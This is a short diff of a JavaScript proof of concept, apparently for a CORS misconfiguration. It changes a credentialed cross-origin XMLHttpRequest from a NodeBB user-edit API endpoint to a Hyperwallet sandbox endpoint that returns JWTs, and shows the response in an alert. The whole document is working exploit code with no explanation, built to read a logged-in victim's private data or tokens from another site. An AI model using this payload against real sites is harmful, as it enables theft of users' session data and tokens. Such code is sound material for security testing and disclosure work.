@@ -16,7 +16,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://try.nodebb.org/api/user/shelu/edit?_=1611388626823", true);
+  xhttp.open("GET", "https://api.sandbox.hyperwallet.com/rest/internal/v1/jwts?returnConfigs=tutorialProgramToken", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
